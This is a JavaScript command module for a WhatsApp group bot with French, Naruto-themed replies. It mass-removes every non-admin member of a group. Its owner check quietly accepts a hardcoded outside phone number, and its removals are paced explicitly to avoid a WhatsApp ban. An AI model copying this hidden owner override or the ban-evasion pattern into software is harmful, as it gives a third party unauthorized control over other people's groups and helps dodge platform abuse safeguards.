const config = require('../config');

module.exports = async (sock, m, args) => {
    try {
        const from = m.key.remoteJid;
        if (!m.isGroup) return sock.sendMessage(from, { text: "Cette technique ne s'utilise que dans un temple (groupe)." });

        const sender = m.key.participant || m.key.remoteJid;
        const cleanSender = sender.split('@')[0];
        const cleanOwner = config.NUMERO_OWNER ? config.NUMERO_OWNER.replace(/[^0-9]/g, '') : '';

        // SÉCURITÉ MAÎTRE
        const isOwner = m.key.fromMe || cleanSender === cleanOwner || cleanSender === '242066969267';
        if (!isOwner) return sock.sendMessage(from, { text: "🏮 Seul le Grand Maître peut déclencher la Purge Totale." });

        const groupMetadata = await sock.groupMetadata(from);
        const participants = groupMetadata.participants;
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';

        // Filtrer pour ne pas s'auto-exclure ou exclure le maître
        const victims = participants.filter(p => !p.admin && p.id !== botId && !p.id.includes(cleanOwner));

        if (victims.length === 0) return sock.sendMessage(from, { text: "🏮 Aucun Shinobi de bas rang à purger ici." });

        await sock.sendMessage(from, { text: `🔥 *PURGE DES SIX CHEMINS EN COURS...*\nAdieu à ${victims.length} Shinobis.` });

        for (let v of victims) {
            await sock.groupParticipantsUpdate(from, [v.id], "remove");
            // Petite pause pour éviter le ban WhatsApp
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        await sock.sendMessage(from, { text: "✅ La dimension a été nettoyée. La paix règne à nouveau." });

    } catch (e) {
        console.error(e);
        sock.sendMessage(from, { text: "❌ La purge a échoué. Chakra insuffisant." });
    }
};
